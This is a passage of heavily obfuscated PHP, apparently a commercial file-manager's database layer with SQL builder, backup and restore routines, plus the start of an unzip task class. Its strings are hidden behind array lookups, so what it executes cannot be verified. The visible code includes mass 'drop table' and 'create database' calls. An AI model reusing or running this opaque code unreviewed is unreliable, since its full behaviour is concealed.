$aÇ±£˜©Ö[938]; } foreach ($cÏŠŸ¾Â’» as $dÂÙÏ†ğ‰â) { $cØÃ‰°ˆ×ö[] = $fˆà×ŠĞ‚ . (is_array($dÂÙÏ†ğ‰â) ? $this->buildSelectSql($dÂÙÏ†ğ‰â) : $dÂÙÏ†ğ‰â); } return implode($aÇ±£˜©Ö[60], $cØÃ‰°ˆ×ö); } public function insert($böÔºØ¹Ëí, $fÔ¤šï¼ÛŞ = array(), $aôêòš“œô = false) { goto d¹×¹¯Şï¿; BÄ©â••æ‹: foreach ($böÔºØ¹Ëí as $E¿¥±¸¾œˆ => $c´¡Ö¦¥İ) { if (is_array($c´¡Ö¦¥İ) && $Bâ†´Œ·Áõ[298] == $c´¡Ö¦¥İ[0]) { $dó¿··¡¿Õ[] = $this->parseKey($E¿¥±¸¾œˆ); $DùÔóß±˜[] = $c´¡Ö¦¥İ[1]; } elseif (is_scalar($c´¡Ö¦¥İ) || is_null($c´¡Ö¦¥İ)) { $dó¿··¡¿Õ[] = $this->parseKey($E¿¥±¸¾œˆ); $DùÔóß±˜[] = $this->parseValue($c´¡Ö¦¥İ); } } $DÁä¿Ü±Å¶ = ($aôêòš“œô ? $Bâ†´Œ·Áõ[808] : $Bâ†´Œ·Áõ[809]) . $Bâ†´Œ·Áõ[810] . $this->parseTable($fÔ¤šï¼ÛŞ[$Bâ†´Œ·Áõ[280]]) . $Bâ†´Œ·Áõ[804] . implode($Bâ†´Œ·Áõ[57], $dó¿··¡¿Õ) . $Bâ†´Œ·Áõ[805] . implode($Bâ†´Œ·Áõ[57], $DùÔóß±˜) . $Bâ†´Œ·Áõ[806]; $DÁä¿Ü±Å¶ .= $this->parseLock(isset($fÔ¤šï¼ÛŞ[$Bâ†´Œ·Áõ[761]]) ? $fÔ¤šï¼ÛŞ[$Bâ†´Œ·Áõ[761]] : !1); goto d²ÅÌ²“¡; d²ÅÌ²“¡: $DÁä¿Ü±Å¶ .= $this->parseComment(!empty($fÔ¤šï¼ÛŞ[$Bâ†´Œ·Áõ[354]]) ? $fÔ¤šï¼ÛŞ[$Bâ†´Œ·Áõ[354]] : $Bâ†´Œ·Áõ[43]); return $this->execute($DÁä¿Ü±Å¶, $this->parseBind(!empty($fÔ¤šï¼ÛŞ[$Bâ†´Œ·Áõ[286]]) ? $fÔ¤šï¼ÛŞ[$Bâ†´Œ·Áõ[286]] : array())); goto d·ˆ„ùøÊÒ; d¹×¹¯Şï¿: $Bâ†´Œ·Áõ =& $_SERVER[¨¤¼…´]; $DùÔóß±˜ = $dó¿··¡¿Õ = array(); $this->model = $fÔ¤šï¼ÛŞ[$Bâ†´Œ·Áõ[282]]; goto BÄ©â••æ‹; d·ˆ„ùøÊÒ: } public function selectInsert($Dâ÷øÓÊˆ, $aÀ»ª‹, $d‚¬›Ôğ‰ = array()) { goto f¶–ä¦ÚêÁ; c³Ü†Ü«¾Ñ: array_walk($Dâ÷øÓÊˆ, array($this, $c»—åĞ›ƒ‘[807])); $bÀ©´´ôª = $c»—åĞ›ƒ‘[939] . $this->parseTable($aÀ»ª‹) . $c»—åĞ›ƒ‘[804] . implode($c»—åĞ›ƒ‘[57], $Dâ÷øÓÊˆ) . $c»—åĞ›ƒ‘[918]; $bÀ©´´ôª .= $this->buildSelectSql($d‚¬›Ôğ‰); goto Dîù´ô´åŠ; Dîù´ô´åŠ: return $this->execute($bÀ©´´ôª, $this->parseBind(!empty($d‚¬›Ôğ‰[$c»—åĞ›ƒ‘[286]]) ? $d‚¬›Ôğ‰[$c»—åĞ›ƒ‘[286]] : array())); goto d™½•ó ¢©; f¶–ä¦ÚêÁ: $c»—åĞ›ƒ‘ =& $_SERVER[¨¤¼…´]; $this->model = $d‚¬›Ôğ‰[$c»—åĞ›ƒ‘[282]]; if (is_string($Dâ÷øÓÊˆ)) { $Dâ÷øÓÊˆ = explode($c»—åĞ›ƒ‘[57], $Dâ÷øÓÊˆ); } goto c³Ü†Ü«¾Ñ; d™½•ó ¢©: } public function update($fé, $a£Úâ°ê‘•) { $FÎ½ÊÊñ¹ =& $_SERVER[¨¤¼…´]; $this->model = $a£Úâ°ê‘•[$FÎ½ÊÊñ¹[282]]; $Fù¢œ’ ¾Ë = $FÎ½ÊÊñ¹[940] . $this->parseTable($a£Úâ°ê‘•[$FÎ½ÊÊñ¹[280]]) . $this->parseSet($fé) . $this->parseWhere(!empty($a£Úâ°ê‘•[$FÎ½ÊÊñ¹[276]]) ? $a£Úâ°ê‘•[$FÎ½ÊÊñ¹[276]] : $FÎ½ÊÊñ¹[43]) . $this->parseOrder(!empty($a£Úâ°ê‘•[$FÎ½ÊÊñ¹[363]]) ? $a£Úâ°ê‘•[$FÎ½ÊÊñ¹[363]] : $FÎ½ÊÊñ¹[43]) . $this->parseLimit(!empty($a£Úâ°ê‘•[$FÎ½ÊÊñ¹[293]]) ? $a£Úâ°ê‘•[$FÎ½ÊÊñ¹[293]] : $FÎ½ÊÊñ¹[43]) . $this->parseLock(isset($a£Úâ°ê‘•[$FÎ½ÊÊñ¹[761]]) ? $a£Úâ°ê‘•[$FÎ½ÊÊñ¹[761]] : !1) . $this->parseComment(!empty($a£Úâ°ê‘•[$FÎ½ÊÊñ¹[354]]) ? $a£Úâ°ê‘•[$FÎ½ÊÊñ¹[354]] : $FÎ½ÊÊñ¹[43]); return $this->execute($Fù¢œ’ ¾Ë, $this->parseBind(!empty($a£Úâ°ê‘•[$FÎ½ÊÊñ¹[286]]) ? $a£Úâ°ê‘•[$FÎ½ÊÊñ¹[286]] : array())); } public function delete($cÑ•‡£„ã¹ = array()) { $eàÁÑ¡ƒƒ =& $_SERVER[¨¤¼…´]; $this->model = $cÑ•‡£„ã¹[$eàÁÑ¡ƒƒ[282]]; $eì‚Ùó†õª = $eàÁÑ¡ƒƒ[941] . $this->parseTable($cÑ•‡£„ã¹[$eàÁÑ¡ƒƒ[280]]) . $this->parseWhere(!empty($cÑ•‡£„ã¹[$eàÁÑ¡ƒƒ[276]]) ? $cÑ•‡£„ã¹[$eàÁÑ¡ƒƒ[276]] : $eàÁÑ¡ƒƒ[43]) . $this->parseOrder(!empty($cÑ•‡£„ã¹[$eàÁÑ¡ƒƒ[363]]) ? $cÑ•‡£„ã¹[$eàÁÑ¡ƒƒ[363]] : $eàÁÑ¡ƒƒ[43]) . $this->parseLimit(!empty($cÑ•‡£„ã¹[$eàÁÑ¡ƒƒ[293]]) ? $cÑ•‡£„ã¹[$eàÁÑ¡ƒƒ[293]] : $eàÁÑ¡ƒƒ[43]) . $this->parseLock(isset($cÑ•‡£„ã¹[$eàÁÑ¡ƒƒ[761]]) ? $cÑ•‡£„ã¹[$eàÁÑ¡ƒƒ[761]] : !1) . $this->parseComment(!empty($cÑ•‡£„ã¹[$eàÁÑ¡ƒƒ[354]]) ? $cÑ•‡£„ã¹[$eàÁÑ¡ƒƒ[354]] : $eàÁÑ¡ƒƒ[43]); return $this->execute($eì‚Ùó†õª, $this->parseBind(!empty($cÑ•‡£„ã¹[$eàÁÑ¡ƒƒ[286]]) ? $cÑ•‡£„ã¹[$eàÁÑ¡ƒƒ[286]] : array())); } public function select($d¸¨óğ©Û = array()) { goto Bêå¢ƒÇà; eñ—……òƒß: if ($F÷Ø¤á£êÃ && !1 !== $C±²Ö…è¨‹) { think_cache($EšĞŒôä´ç, $C±²Ö…è¨‹, $F÷Ø¤á£êÃ); } return $C±²Ö…è¨‹; goto C½³ó»ÌĞ; Bêå¢ƒÇà: $dõå¤ŸÊ™æ =& $_SERVER[¨¤¼…´]; $this->model = $d¸¨óğ©Û[$dõå¤ŸÊ™æ[282]]; $e¼Æ¬Ë‚¨× = $this->buildSelectSql($d¸¨óğ©Û); goto B•‹¶¤•£; B•‹¶¤•£: $F÷Ø¤á£êÃ = isset($d¸¨óğ©Û[$dõå¤ŸÊ™æ[350]]) ? $d¸¨óğ©Û[$dõå¤ŸÊ™æ[350]] : !1; if ($F÷Ø¤á£êÃ) { $EšĞŒôä´ç = is_string($F÷Ø¤á£êÃ[$dõå¤ŸÊ™æ[99]]) ? $F÷Ø¤á£êÃ[$dõå¤ŸÊ™æ[99]] : $dõå¤ŸÊ™æ[942] . md5($e¼Æ¬Ë‚¨×); $eò„—İ¹òÚ = think_cache($EšĞŒôä´ç, $dõå¤ŸÊ™æ[43], $F÷Ø¤á£êÃ); if (!1 !== $eò„—İ¹òÚ) { return $eò„—İ¹òÚ; } } $C±²Ö…è¨‹ = $this->query($e¼Æ¬Ë‚¨×, $this->parseBind(!empty($d¸¨óğ©Û[$dõå¤ŸÊ™æ[286]]) ? $d¸¨óğ©Û[$dõå¤ŸÊ™æ[286]] : array())); goto eñ—……òƒß; C½³ó»ÌĞ: } public function buildSelectSql($a†‹™ ƒğÈ = array()) { goto DŠÓÁÀÈùë; A”˜É“¬Ì: return $e…ê™¾¥õ¡; goto B¾Óƒ½á¿š; DŠÓÁÀÈùë: $cÊî“ÓË†¨ =& $_SERVER[¨¤¼…´]; if (isset($a†‹™ ƒğÈ[$cÊî“ÓË†¨[353]])) { if (strpos($a†‹™ ƒğÈ[$cÊî“ÓË†¨[353]], $cÊî“ÓË†¨[57])) { list($fç…â¦—Ü, $dÙíáí½ÌÎ) = explode($cÊî“ÓË†¨[57], $a†‹™ ƒğÈ[$cÊî“ÓË†¨[353]]); } else { $fç…â¦—Ü = $a†‹™ ƒğÈ[$cÊî“ÓË†¨[353]]; } $fç…â¦—Ü = $fç…â¦—Ü ? $fç…â¦—Ü : 1; $dÙíáí½ÌÎ = isset($dÙíáí½ÌÎ) ? $dÙíáí½ÌÎ : (is_numeric($a†‹™ ƒğÈ[$cÊî“ÓË†¨[293]]) ? $a†‹™ ƒğÈ[$cÊî“ÓË†¨[293]] : 20); $A×»®Úé¨¡ = $dÙíáí½ÌÎ * ((int) $fç…â¦—Ü - 1); $a†‹™ ƒğÈ[$cÊî“ÓË†¨[293]] = $A×»®Úé¨¡ . $cÊî“ÓË†¨[57] . $dÙíáí½ÌÎ; } if (think_config($cÊî“ÓË†¨[943])) { $aÂçåóº³ = $cÊî“ÓË†¨[944] . md5(serialize($a†‹™ ƒğÈ)); $c¡™Çõà = think_cache($aÂçåóº³); if ($c¡™Çõà) { return $c¡™Çõà; } } goto FÃ„™è÷ãˆ; FÃ„™è÷ãˆ: $e…ê™¾¥õ¡ = $this->parseSql($this->selectSql, $a†‹™ ƒğÈ); $e…ê™¾¥õ¡ .= $this->parseLock(isset($a†‹™ ƒğÈ[$cÊî“ÓË†¨[761]]) ? $a†‹™ ƒğÈ[$cÊî“ÓË†¨[761]] : !1); if (isset($aÂçåóº³)) { think_cache($aÂçåóº³, $e…ê™¾¥õ¡); } goto A”˜É“¬Ì; B¾Óƒ½á¿š: } public function parseSql($D¿…ŸéŸÁƒ, $EéÈ«š†² = array()) { $C…ĞŠÖ‘ =& $_SERVER[¨¤¼…´]; $D¿…ŸéŸÁƒ = str_replace(array($C…ĞŠÖ‘[945], $C…ĞŠÖ‘[946], $C…ĞŠÖ‘[947], $C…ĞŠÖ‘[948], $C…ĞŠÖ‘[949], $C…ĞŠÖ‘[950], $C…ĞŠÖ‘[951], $C…ĞŠÖ‘[952], $C…ĞŠÖ‘[953], $C…ĞŠÖ‘[954], $C…ĞŠÖ‘[955]), array($this->parseTable("{$EéÈ«š†²[$C…ĞŠÖ‘[280]]}"), $this->parseDistinct(isset($EéÈ«š†²[$C…ĞŠÖ‘[956]]) ? $EéÈ«š†²[$C…ĞŠÖ‘[956]] : !1), $this->parseField(!empty($EéÈ«š†²[$C…ĞŠÖ‘[274]]) ? $EéÈ«š†²[$C…ĞŠÖ‘[274]] : $C…ĞŠÖ‘[190]), $this->parseJoin(!empty($EéÈ«š†²[$C…ĞŠÖ‘[283]]) ? $EéÈ«š†²[$C…ĞŠÖ‘[283]] : $C…ĞŠÖ‘[43]), $this->parseWhere(!empty($EéÈ«š†²[$C…ĞŠÖ‘[276]]) ? $EéÈ«š†²[$C…ĞŠÖ‘[276]] : $C…ĞŠÖ‘[43]), $this->parseGroup(!empty($EéÈ«š†²[$C…ĞŠÖ‘[957]]) ? $EéÈ«š†²[$C…ĞŠÖ‘[957]] : $C…ĞŠÖ‘[43]), $this->parseHaving(!empty($EéÈ«š†²[$C…ĞŠÖ‘[958]]) ? $EéÈ«š†²[$C…ĞŠÖ‘[958]] : $C…ĞŠÖ‘[43]), $this->parseOrder(!empty($EéÈ«š†²[$C…ĞŠÖ‘[363]]) ? $EéÈ«š†²[$C…ĞŠÖ‘[363]] : $C…ĞŠÖ‘[43]), $this->parseLimit(!empty($EéÈ«š†²[$C…ĞŠÖ‘[293]]) ? $EéÈ«š†²[$C…ĞŠÖ‘[293]] : $C…ĞŠÖ‘[43]), $this->parseUnion(!empty($EéÈ«š†²[$C…ĞŠÖ‘[348]]) ? $EéÈ«š†²[$C…ĞŠÖ‘[348]] : $C…ĞŠÖ‘[43]), $this->parseComment(!empty($EéÈ«š†²[$C…ĞŠÖ‘[354]]) ? $EéÈ«š†²[$C…ĞŠÖ‘[354]] : $C…ĞŠÖ‘[43])), $D¿…ŸéŸÁƒ); return $D¿…ŸéŸÁƒ; } public function getLastSql($d®ãÌ…æª‹ = '') { return $d®ãÌ…æª‹ ? $this->modelSql[$d®ãÌ…æª‹] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($cÑàæ÷ •œ) { return addslashes($cÑàæ÷ •œ); } public function setModel($a¨©Üºº”) { $this->model = $a¨©Üºº”; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($A«ùªîŠÌ‹, $b¬“´»Áß‘ = '') { $this->database = $A«ùªîŠÌ‹; $this->type = $b¬“´»Áß‘; } public function model($aÛÙô’ŸØ = '') { return new ModelBase($aÛÙô’ŸØ, $_SERVER[¨¤¼…´][43], $this->database); } public function db($CÈóÅˆä’Ã = false) { goto d³†…§Ö; eàùÈÈƒİ : $this->database = $B¥Ñ‰õùÌË; $Aí²É­·ˆ->execute("\x75\x73\x65\40\140{$c¦À¸´›Ë’}\140"); return $Aí²É­·ˆ; goto a­äîÔ²ì´; F¸èõˆ£¬Û: $this->database = $B¥Ñ‰õùÌË; $Aí²É­·ˆ = $this->model()->db(); try { $CÚ¨ô‰ÑÌÕ = $Aí²É­·ˆ->execute("\x73\x68\157\x77\x20\x64\x61\164\x61\142\x61\x73\x65\x73\x20\154\151\x6b\x65\x20\x27{$c¦À¸´›Ë’}\47"); } catch (Exception $cÔ²½¯ß´‘) { } goto fîƒ¦ìºÂò; fîƒ¦ìºÂò: if (!$CÚ¨ô‰ÑÌÕ) { $Aí²É­·ˆ->execute("\143\162\145\141\x74\x65\x20\x64\141\164\x61\x62\x61\163\x65\40\140{$c¦À¸´›Ë’}\x60"); } $B¥Ñ‰õùÌË[$bøÏéÅ·Ğ…[871]] = $c¦À¸´›Ë’; if ($B¥Ñ‰õùÌË[$bøÏéÅ·Ğ…[712]] == $bøÏéÅ·Ğ…[713]) { $B¥Ñ‰õùÌË[$bøÏéÅ·Ğ…[714]] .= $bøÏéÅ·Ğ…[959] . $c¦À¸´›Ë’; } goto eàùÈÈƒİ ; d³†…§Ö: $bøÏéÅ·Ğ… =& $_SERVER[¨¤¼…´]; $B¥Ñ‰õùÌË = array_change_key_case($this->database); if ($this->type == $bøÏéÅ·Ğ…[19] || !$CÈóÅˆä’Ã) { return $this->model()->db(); } goto d´‘á¯±Ë; d´‘á¯±Ë: $c¦À¸´›Ë’ = $B¥Ñ‰õùÌË[$bøÏéÅ·Ğ…[871]]; $B¥Ñ‰õùÌË[$bøÏéÅ·Ğ…[871]] = $bøÏéÅ·Ğ…[43]; if ($B¥Ñ‰õùÌË[$bøÏéÅ·Ğ…[712]] == $bøÏéÅ·Ğ…[713]) { $bÁİ¨œ¦ñ = $B¥Ñ‰õùÌË[$bøÏéÅ·Ğ…[714]]; $B¥Ñ‰õùÌË[$bøÏéÅ·Ğ…[714]] = substr($bÁİ¨œ¦ñ, 0, strrpos($bÁİ¨œ¦ñ, $bøÏéÅ·Ğ…[959])); } goto F¸èõˆ£¬Û; a­äîÔ²ì´: } public function createTable($B‚·ŒÈÒÑ¯, $aÎóßµŠ†¤ = null) { $E§„Ìéº—„ =& $_SERVER[¨¤¼…´]; if (!IO::exist($B‚·ŒÈÒÑ¯)) { ActionCall($E§„Ìéº—„[960], !0, 0); show_json(LNG($E§„Ìéº—„[961]), !1); } $DÀÖÆÄò£§ = sqlSplit(IO::getContent($B‚·ŒÈÒÑ¯)); foreach ($DÀÖÆÄò£§ as $aƒ”®æ¿“Ì) { if ($aÎóßµŠ†¤) { $EÑ°®‘‰Û = stripos($aƒ”®æ¿“Ì, $E§„Ìéº—„[962]) === 0; if ($EÑ°®‘‰Û) { $aÎóßµŠ†¤->task[$E§„Ìéº—„[963]] += 1; } } $this->model()->db()->execute($aƒ”®æ¿“Ì); if ($aÎóßµŠ†¤ && $EÑ°®‘‰Û) { preg_match($E§„Ìéº—„[964], $aƒ”®æ¿“Ì, $fßĞÕê÷Èé); $aÎóßµŠ†¤->task[$E§„Ìéº—„[965]] = $fßĞÕê÷Èé[1]; $aÎóßµŠ†¤->update(1); } } $this->taskToCache($aÎóßµŠ†¤); } public function insertTable($c¤ÀôÏÌ‡Á, $AõïÈÊ¥˜ = null) { $F†§¹“¥ “ =& $_SERVER[¨¤¼…´]; $EÖí¦áŠË = $this->model()->db(); $FÈ áç£¦ª = $AœŞ‰§‡½Á ? array($AœŞ‰§‡½Á) : $EÖí¦áŠË->getTables(); foreach ($c¤ÀôÏÌ‡Á as $F‡Ø±¸ë¯Ê) { $AœŞ‰§‡½Á = basename($F‡Ø±¸ë¯Ê, $F†§¹“¥ “[707]); if (!in_array($AœŞ‰§‡½Á, $FÈ áç£¦ª)) { continue; } if ($AõïÈÊ¥˜) { $AõïÈÊ¥˜->task[$F†§¹“¥ “[965]] = $AœŞ‰§‡½Á; } if (get_filesize($F‡Ø±¸ë¯Ê) == 0) { continue; } $fæ©¤àª“õ = $this->sqlToDb($F‡Ø±¸ë¯Ê, $AõïÈÊ¥˜); if (!$fæ©¤àª“õ) { ActionCall($F†§¹“¥ “[960], !0, 0); show_json(LNG($F†§¹“¥ “[966]) . "\x5b{$AœŞ‰§‡½Á}\x5d", !1); } } $this->taskToCache($AõïÈÊ¥˜); } public function sqlFromDb($B¦´ÜÁñ‡¸, $A­…Šô—Ò, $A… Ø¼ÌÑ¼ = null, $A¸‡Ûô¨½© = null) { goto aâß÷ÕïÓÇ; AñéšÂğõß: $AÚà¯ĞåÑ = 1; $DÙí˜¨• = 500; $C—ä ©“ĞÇ = fopen($A­…Šô—Ò, $_SERVER[¨¤¼…´][967]); goto CÈÒÀ†’ÅÕ; aâß÷ÕïÓÇ: if ($A… Ø¼ÌÑ¼) { $A… Ø¼ÌÑ¼->task[$_SERVER[¨¤¼…´][965]] = $B¦´ÜÁñ‡¸; } $dæ…ø¬Ø½— = $this->model($B¦´ÜÁñ‡¸); $d™éõ–ÚÜï = 0; goto AñéšÂğõß; fĞÀ—™õ»: fclose($C—ä ©“ĞÇ); return $d™éõ–ÚÜï; goto c­ˆ³è—Å°; CÈÒÀ†’ÅÕ: $fçíº¥ùÉ = $dæ…ø¬Ø½—->getPk(); $Bïò ¤Ô©‰ = $dæ…ø¬Ø½—->getDbFields(); do { $fÆø´Æ¶Ê = $dæ…ø¬Ø½—->field($Bïò ¤Ô©‰)->order($fçíº¥ùÉ . $_SERVER[¨¤¼…´][968])->selectPage($DÙí˜¨•, $AÚà¯ĞåÑ); $AØíòÉÒ™æ = isset($fÆø´Æ¶Ê[$_SERVER[¨¤¼…´][364]][$_SERVER[¨¤¼…´][366]]) ? $fÆø´Æ¶Ê[$_SERVER[¨¤¼…´][364]][$_SERVER[¨¤¼…´][366]] : 0; $e¶èãâ©˜ç = !empty($fÆø´Æ¶Ê[$_SERVER[¨¤¼…´][367]]) ? $fÆø´Æ¶Ê[$_SERVER[¨¤¼…´][367]] : array(); if (!($aìÒÛÈ¯œİ = count($e¶èãâ©˜ç))) { break; } $e…Ó†¤†½‰ = array(); foreach ($e¶èãâ©˜ç as $DŸ–àíÂ) { if ($B¦´ÜÁñ‡¸ == $_SERVER[¨¤¼…´][969] && $DŸ–àíÂ[$_SERVER[¨¤¼…´][39]] == $_SERVER[¨¤¼…´][970]) { $E¶ƒ‘‰ÆÉ = json_decode($DŸ–àíÂ[$_SERVER[¨¤¼…´][372]], !0); if ($E¶ƒ‘‰ÆÉ[$_SERVER[¨¤¼…´][38]] == date($_SERVER[¨¤¼…´][680]) && !$E¶ƒ‘‰ÆÉ[$_SERVER[¨¤¼…´][679]]) { continue; } } if ($A¸‡Ûô¨½©) { $DŸ–àíÂ[$_SERVER[¨¤¼…´][85]] = "\x7b\x69\x6f\x3a{$A¸‡Ûô¨½©}\175" . substr($DŸ–àíÂ[$_SERVER[¨¤¼…´][85]], strlen("\173\x69\x6f\x3a{$DŸ–àíÂ[$_SERVER[¨¤¼…´][733]]}\175")); $DŸ–àíÂ[$_SERVER[¨¤¼…´][733]] = $A¸‡Ûô¨½©; } $e…Ó†¤†½‰[] = $_SERVER[¨¤¼…´][971] . $this->sqlEncode($DŸ–àíÂ) . $_SERVER[¨¤¼…´][972]; } $dá·¾ÔÊÆ = "\x49\x4e\x53\x45\122\x54\40\111\116\x54\x4f\x20\x60{$B¦´ÜÁñ‡¸}\140\40\x28\x60" . implode($_SERVER[¨¤¼…´][973], $Bïò ¤Ô©‰) . $_SERVER[¨¤¼…´][974]; fwrite($C—ä ©“ĞÇ, $dá·¾ÔÊÆ . implode($_SERVER[¨¤¼…´][975], $e…Ó†¤†½‰) . $_SERVER[¨¤¼…´][77] . PHP_EOL); $AÚà¯ĞåÑ++; $d™éõ–ÚÜï += $aìÒÛÈ¯œİ; if ($A… Ø¼ÌÑ¼) { $A… Ø¼ÌÑ¼->update($aìÒÛÈ¯œİ); } } while ($AÚà¯ĞåÑ <= $AØíòÉÒ™æ); goto fĞÀ—™õ»; c­ˆ³è—Å°: } public function sqlToDb($B™‡‚‡×ê, $E­ãËªƒ = null) { goto CªÛ˜·š¶; dˆéŒ²¤Ù¼: $B’¸©Æ’ÛŸ = 500 + 1; while (!feof($f°®ÜÇÂÑê)) { if ($E­ãËªƒ && $cÑÃ‡¯ç» != 0) { $E­ãËªƒ->task[$a¾œ¸‘¾±[963]] += 1; } $cÑÃ‡¯ç»++; $d¿Ö·´ä‡ = trim(fgets($f°®ÜÇÂÑê)); $C’Ê‚¸Š¬ .= $a¾œ¸‘¾±[60] . $this->sqlDecode($d¿Ö·´ä‡, $this->type); if ($cÑÃ‡¯ç» == $B’¸©Æ’ÛŸ) { $C’Ê‚¸Š¬ = rtrim(trim($C’Ê‚¸Š¬), $a¾œ¸‘¾±[77]); if (!$f¨ÅÓÌë->execute($C’Ê‚¸Š¬)) { return !1; } if ($E­ãËªƒ) { $E­ãËªƒ->update($cÑÃ‡¯ç» - 1); } $C’Ê‚¸Š¬ = $a¾œ¸‘¾±[43]; $cÑÃ‡¯ç» = 0; } } fclose($f°®ÜÇÂÑê); goto b“µ—Æìˆ”; CªÛ˜·š¶: $a¾œ¸‘¾± =& $_SERVER[¨¤¼…´]; $f¨ÅÓÌë = $this->model()->db(); $f°®ÜÇÂÑê = @fopen($B™‡‚‡×ê, $a¾œ¸‘¾±[976]); goto fÇ óƒÍßÀ; b“µ—Æìˆ”: if (trim($C’Ê‚¸Š¬)) { $C’Ê‚¸Š¬ = rtrim(trim($C’Ê‚¸Š¬), $a¾œ¸‘¾±[77]); if (!$f¨ÅÓÌë->execute($C’Ê‚¸Š¬)) { return !1; } if ($E­ãËªƒ) { $E­ãËªƒ->update($cÑÃ‡¯ç» - 1); } } return !0; goto f¦à‹µ‚»; fÇ óƒÍßÀ: if (!$f°®ÜÇÂÑê) { return !1; } $cÑÃ‡¯ç» = 0; $C’Ê‚¸Š¬ = $a¾œ¸‘¾±[43]; goto dˆéŒ²¤Ù¼; f¦à‹µ‚»: } public function dropTable($AóŠ×÷ öÀ = null) { $D®ÜÊÁµ±¯ = $this->model()->db(); $cÍÔõõ¯ÒÑ = $AóŠ×÷ öÀ ? array($AóŠ×÷ öÀ) : $D®ÜÊÁµ±¯->getTables(); if (!$cÍÔõõ¯ÒÑ) { return; } foreach ($cÍÔõõ¯ÒÑ as $AóŠ×÷ öÀ) { $D®ÜÊÁµ±¯->execute("\144\162\157\x70\40\x74\141\x62\154\145\40\x69\146\40\x65\x78\x69\163\164\163\40\x60{$AóŠ×÷ öÀ}\x60"); } } private function taskToCache($BŸí¬Ó’µâ = null) { $E¼†ï¼¥¿É =& $_SERVER[¨¤¼…´]; if (!$BŸí¬Ó’µâ) { return; } $c–‡Êà—ºƒ = array($E¼†ï¼¥¿É[965] => $BŸí¬Ó’µâ->task[$E¼†ï¼¥¿É[965]], $E¼†ï¼¥¿É[963] => $BŸí¬Ó’µâ->task[$E¼†ï¼¥¿É[963]], $E¼†ï¼¥¿É[977] => $BŸí¬Ó’µâ->task[$E¼†ï¼¥¿É[977]]); if ($c–‡Êà—ºƒ[$E¼†ï¼¥¿É[963]] == $c–‡Êà—ºƒ[$E¼†ï¼¥¿É[977]]) { $c–‡Êà—ºƒ[$E¼†ï¼¥¿É[686]] = 1; } Cache::set($E¼†ï¼¥¿É[978] . $BŸí¬Ó’µâ->task[$E¼†ï¼¥¿É[379]], $c–‡Êà—ºƒ); $BŸí¬Ó’µâ->end(); } private function sqlEncode($eÒÃÜ‘ÖÕ) { $a¹œğÃÙÑœ =& $_SERVER[¨¤¼…´]; $c—¨¢ÚßÅ¼ = array(); foreach ($eÒÃÜ‘ÖÕ as $D‡Úã•§¿Û) { if (is_array($D‡Úã•§¿Û)) { $D‡Úã•§¿Û = json_encode_force($D‡Úã•§¿Û); } $D‡Úã•§¿Û = addslashes($D‡Úã•§¿Û); $D‡Úã•§¿Û = str_replace(array($a¹œğÃÙÑœ[979], $a¹œğÃÙÑœ[14]), array($a¹œğÃÙÑœ[980], $a¹œğÃÙÑœ[981]), $D‡Úã•§¿Û); $c—¨¢ÚßÅ¼[] = str_replace($a¹œğÃÙÑœ[65], $a¹œğÃÙÑœ[982], $D‡Úã•§¿Û); } return $a¹œğÃÙÑœ[65] . implode($a¹œğÃÙÑœ[983], $c—¨¢ÚßÅ¼) . $a¹œğÃÙÑœ[65]; } private function sqlDecode($cë±¤¢’ëº, $Fˆ’Á¾‰¤) { $bì ÓÎÑéÓ =& $_SERVER[¨¤¼…´]; $cë±¤¢’ëº = str_replace(array($bì ÓÎÑéÓ[980], $bì ÓÎÑéÓ[981]), array($bì ÓÎÑéÓ[979], $bì ÓÎÑéÓ[14]), $cë±¤¢’ëº); if ($Fˆ’Á¾‰¤ == $bì ÓÎÑéÓ[19]) { $cë±¤¢’ëº = stripslashes($cë±¤¢’ëº); } return $cë±¤¢’ëº; } } goto b¢óö„Š„¸; e¸óÈª„®¸: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto fÚöø¦ç‚; fÚöø¦ç‚: $EÁ…’œ¨³Ş =& $_SERVER[¨¤¼…´]; parent::startAfter(); Hook::bind($EÁ…’œ¨³Ş[1495], array($this, $EÁ…’œ¨³Ş[1496])); goto Fç…½ä“§ê; Fç…½ä“§ê: Hook::bind($EÁ…’œ¨³Ş[1026], array($this, $EÁ…’œ¨³Ş[1497])); $Câæã Š‚İ =& $this->task; $Câæã Š‚İ[$EÁ…’œ¨³Ş[1498]] = $EÁ…’œ¨³Ş[1031]; goto f¯Æà©ÏÁß; f¯Æà©ÏÁß: if (!$Câæã Š‚İ[$EÁ…’œ¨³Ş[1331]]) { $Câæã Š‚İ[$EÁ…’œ¨³Ş[1331]] = LNG($EÁ…’œ¨³Ş[1499]); } goto aîˆ“¯÷¬‹; aîˆ“¯÷¬‹: } protected function endAfter() { $e²Ã”Š½Ï =& $_SERVER[¨¤¼…´]; parent::endAfter(); Hook::unbind($e²Ã”Š½Ï[1495], array($this, $e²Ã”Š½Ï[1496])); Hook::unbind($e²Ã”Š½Ï[1026], array($this, $e²Ã”Š½Ï[1497])); } public function updateAfter() { $f«¿‡ºòÚœ =& $_SERVER[¨¤¼…´]; $EÎ•ôá›î =& $this->task; if (!$EÎ•ôá›î[$f«¿‡ºòÚœ[963]] || !$EÎ•ôá›î[$f«¿‡ºòÚœ[688]]) { return; } if ($EÎ•ôá›î[$f«¿‡ºòÚœ[1498]] == $f«¿‡ºòÚœ[1031]) { $f¨š¯ù® = 0; if ($EÎ•ôá›î[$f«¿‡ºòÚœ[1470]]) { $f¨š¯ù® = $EÎ•ôá›î[$f«¿‡ºòÚœ[1471]] / $EÎ•ôá›î[$f«¿‡ºòÚœ[1470]]; } $EÎ•ôá›î[$f«¿‡ºòÚœ[1426]] = $f¨š¯ù® * 0.3; } else { if ($EÎ•ôá›î[$f«¿‡ºòÚœ[1498]] == $f«¿‡ºòÚœ[314]) { $f¨š¯ù® = $EÎ•ôá›î[$f«¿‡ºòÚœ[977]] / $EÎ•ôá›î[$f«¿‡ºòÚœ[963]]; $EÎ•ôá›î[$f«¿‡ºòÚœ[1426]] = 0.3 + $f¨š¯ù® * 0.4; } else { if ($EÎ•ôá›î[$f«¿‡ºòÚœ[1498]] == $f«¿‡ºòÚœ[113]) { $aˆÅøğ—à = 0; if ($EÎ•ôá›î[$f«¿‡ºòÚœ[1472]] == $f«¿‡ºòÚœ[113]) { $aˆÅøğ—à = $EÎ•ôá›î[$f«¿‡ºòÚœ[1471]]; } $f¨š¯ù® = 